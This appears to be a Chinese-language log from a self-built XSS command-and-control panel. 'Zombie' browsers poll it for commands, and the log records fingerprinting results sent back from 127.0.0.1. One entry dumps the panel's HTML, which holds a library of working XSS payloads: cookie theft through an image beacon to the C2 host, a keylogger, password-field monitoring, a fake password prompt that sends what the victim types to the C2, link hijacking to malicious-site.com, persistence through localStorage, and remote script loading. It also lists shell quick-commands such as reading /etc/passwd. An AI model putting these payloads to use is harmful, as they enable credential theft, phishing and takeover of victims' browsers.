2025-06-26 23:03:05 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T15:03:05.127Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": true,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 23:03:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0056s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 23:03:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:03:05] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 23:03:12 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 23:03:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:03:12] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 23:03:42 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 23:03:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:03:42] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 23:04:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 23:04:05 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 23:04:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 23:04:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:04:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 23:04:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 23:04:05 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T15:04:05.130Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": true,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 23:04:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0039s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 23:04:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:04:05] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 23:04:43 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 23:04:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:04:43] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 23:05:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 23:05:05 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 23:05:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 23:05:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:05:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 23:05:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 23:05:05 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T15:05:05.130Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": true,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 23:05:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0039s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 23:05:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:05:05] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 23:05:11 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 23:05:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:05:11] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 23:05:41 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 23:05:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:05:41] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 23:06:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 23:06:05 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 23:06:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 23:06:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:06:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 23:06:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 23:06:05 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T15:06:05.129Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": true,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 23:06:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0040s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 23:06:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:06:05] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 23:06:11 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 23:06:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:06:11] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 23:06:41 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 23:06:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:06:41] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 23:07:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 23:07:05 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 23:07:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 23:07:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:07:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 23:07:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 23:07:05 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T15:07:05.132Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": true,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 23:07:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0040s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 23:07:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:07:05] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 23:07:11 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 23:07:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:07:11] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 23:07:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 23:07:38 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 23:07:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 23:07:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:07:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 23:07:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 23:07:38 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T15:07:38.078Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": true,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 23:07:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0058s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 23:07:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:07:38] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 23:07:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 23:07:41 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 23:07:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0026s) -> 回傳: <Response 442 bytes [200 OK]>
2025-06-26 23:07:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:07:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 23:07:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 23:07:41 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"(function(){ var fingerprint = { screen: screen.width + \"x\" + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()","timestamp":"2025-06-26T15:07:41.679Z","success":true,"output":"{\n  \"screen\": \"1920x1080\",\n  \"timezone\": \"Asia/Manila\",\n  \"language\": \"zh-TW\",\n  \"platform\": \"Linux x86_64\",\n  \"plugins\": [\n    \"PDF Viewer\",\n    \"Chrome PDF Viewer\",\n    \"Chromium PDF Viewer\",\n    \"Microsoft Edge PDF Viewer\",\n    \"WebKit built-in PDF\"\n  ],\n  \"cookieEnabled\": true,\n  \"onLine\": true,\n  \"hardwareConcurrency\": 20\n}","error":null}
2025-06-26 23:07:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0039s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 23:07:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:07:41] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 23:07:42 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 23:07:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:07:42] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 23:07:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-26 23:07:45 | INFO     | control_route.py:138 | xss_payload() | 用戶請求XSS載荷文件
2025-06-26 23:07:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 4313 bytes [200 OK]>
2025-06-26 23:07:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:07:45] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-26 23:07:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 23:07:45 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-26 23:07:45 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 23:07:45 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: {"where":"http://127.0.0.1:8000/","hostname":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-26T15:07:45.211Z"},時間: 2025-06-26 23:07:45.224652
2025-06-26 23:07:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0053s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-26 23:07:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:07:45] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-26 23:07:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 23:07:45 | INFO     | control_route.py:84 | get_messages() | 用戶請求獲取消息
2025-06-26 23:07:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0015s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n\n\n<head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>控制消息</title>\n    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n    \n</head>\n\n<body>\n    <!-- 导航栏 -->\n    <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n        <div class="container">\n            <a class="navbar-brand" href="/">\n                <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n            </a>\n            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                <span class="navbar-toggler-icon"></span>\n            </button>\n            <div class="collapse navbar-collapse" id="navbarNav">\n                <ul class="navbar-nav ms-auto">\n                    <li class="nav-item">\n                        <a class="nav-link" href="/">\n                            <i class="fas fa-home"></i> 目标列表\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/add_target">\n                            <i class="fas fa-plus"></i> 添加目标\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/api/control/get_messages">\n                            <i class="fas fa-cog"></i> 控制消息\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/api/flaresolverr/dashboard">\n                            <i class="fas fa-cog"></i> FlareSolverr\n                        </a>\n                    </li>\n                </ul>\n            </div>\n        </div>\n    </nav>\n\n    \n    \n    \n\n    \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                        <button type="button" class="quick-cmd-btn"></button>\n                    </div>\n                </div>\n                <label class="form-label">XSS載荷</label>\n                <div class="xss-payload">\n                    <!-- 基礎 XSS 載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ return document.cookie || &quot;無Cookie&quot;; })()\')">查看Cookie</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var links = []; document.querySelectorAll(&quot;a&quot;).forEach(function(a){ links.push({text: a.innerText, href: a.href, target: a.target}); }); return JSON.stringify(links, null, 2); })()\')">查看所有連結</button>\n\n                    <!-- 信息收集類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var info = { title: document.title, url: window.location.href, userAgent: navigator.userAgent, referrer: document.referrer, domain: document.domain }; return JSON.stringify(info, null, 2); })()\')">基本信息收集</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var forms = []; document.querySelectorAll(&quot;form&quot;).forEach(function(f, i){ forms.push({ index: i+1, action: f.action, method: f.method, inputs: Array.from(f.querySelectorAll(&quot;input&quot;)).map(inp => ({name: inp.name, type: inp.type, value: inp.value})) }); }); return JSON.stringify(forms, null, 2); })()\')">查看所有表單</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var inputs = []; document.querySelectorAll(&quot;input&quot;).forEach(function(inp){ inputs.push({name: inp.name, type: inp.type, value: inp.value, placeholder: inp.placeholder}); }); return JSON.stringify(inputs, null, 2); })()\')">查看表單輸入值</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ return JSON.stringify({ localStorage: Object.keys(localStorage).reduce((obj, key) => { obj[key] = localStorage[key]; return obj; }, {}), sessionStorage: Object.keys(sessionStorage).reduce((obj, key) => { obj[key] = sessionStorage[key]; return obj; }, {}) }, null, 2); })()\')">查看本地存儲</button>\n\n                    <!-- 鍵盤記錄類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var keys = []; document.addEventListener(\\\'keypress\\\', function(e){ keys.push(e.key); if(keys.length > 50) { alert(\\\'按鍵記錄: \\\' + keys.join(\\\'\\\')); keys = []; } });\')">啟動按鍵記錄</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'input[type=password]\\\').forEach(function(pwd){ pwd.addEventListener(\\\'input\\\', function(){ console.log(\\\'密碼輸入: \\\' + pwd.value); }); });\')">密碼欄位監控</button>\n\n                    <!-- 頁面操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.style.transform = \\\'rotate(180deg)\\\'; setTimeout(function(){ document.body.style.transform = \\\'rotate(0deg)\\\'; }, 3000);\')">翻轉頁面3秒</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.innerHTML = \\\'<h1 style=&quot;color:red;text-align:center;margin-top:200px;&quot;>你的網站已被接管！</h1>\\\';\')">替換頁面內容</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'setInterval(function(){ document.body.style.backgroundColor = [\\\'red\\\',\\\'blue\\\',\\\'green\\\',\\\'yellow\\\'][Math.floor(Math.random()*4)]; }, 500);\')">閃爍背景色</button>\n\n                    <!-- 網路請求類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'XSS測試成功 - 來自: \\\' + window.location.href, target_ip: window.location.hostname}) });\')">發送測試消息</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var img = new Image(); img.src = \\\'http://127.0.0.1:8964/api/control/add_message?message=\\\' + encodeURIComponent(\\\'XSS via Image - Cookie: \\\' + document.cookie) + \\\'&target_ip=\\\' + window.location.hostname;\')">通過圖片發送Cookie</button>\n\n                    <!-- 瀏覽器指紋收集 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var fingerprint = { screen: screen.width + &quot;x&quot; + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()\')">瀏覽器指紋</button>\n\n                    <!-- 社交工程類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var userInput = prompt(\\\'系統安全檢查：請輸入您的密碼以繼續\\\'); if(userInput) { fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'釣魚成功 - 密碼: \\\' + userInput, target_ip: window.location.hostname}) }); }\')">密碼釣魚</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'if(confirm(\\\'檢測到安全威脅！是否要下載安全補丁？\\\')) { alert(\\\'用戶同意下載，可以進行下一步攻擊\\\'); }\')">安全威脅詐騙</button>\n\n                    <!-- 持久性 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'localStorage.setItem(\\\'xss_payload\\\', \\\'setInterval(function(){ console.log(&quot;XSS仍在運行: &quot; + new Date()); }, 30000);\\\'); eval(localStorage.getItem(\\\'xss_payload\\\'));\')">本地存儲持久化</button>\n\n                    <!-- DOM 操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var maliciousDiv = document.createElement(\\\'div\\\'); maliciousDiv.innerHTML = \\\'<div style=&quot;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;color:white;text-align:center;padding-top:200px;&quot;><h2>系統錯誤</h2><p>請聯繫管理員</p></div>\\\'; document.body.appendChild(maliciousDiv);\')">偽造錯誤覆蓋層</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'a\\\').forEach(function(link){ if(link.href.includes(\\\'http\\\')) { link.href = \\\'http://malicious-site.com/redirect?original=\\\' + encodeURIComponent(link.href); } });\')">劫持所有外部連結</button>\n\n                    <!-- 高級載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var script = document.createElement(&quot;script&quot;); script.src = &quot;http://127.0.0.1:8964/api/control/xss_payload&quot;; document.head.appendChild(script); return &quot;遠程腳本載入中...&quot;; })()\')">載入遠程腳本</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ return document.documentElement.outerHTML.substring(0, 2000); })()\')">竊取頁面HTML</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var scripts = []; document.querySelectorAll(&quot;script&quot;).forEach(function(s){ scripts.push({src: s.src, content: s.innerHTML.substring(0, 200)}); }); return JSON.stringify(scripts, null, 2); })()\')">查看頁面腳本</button>\n                    <button type="button" 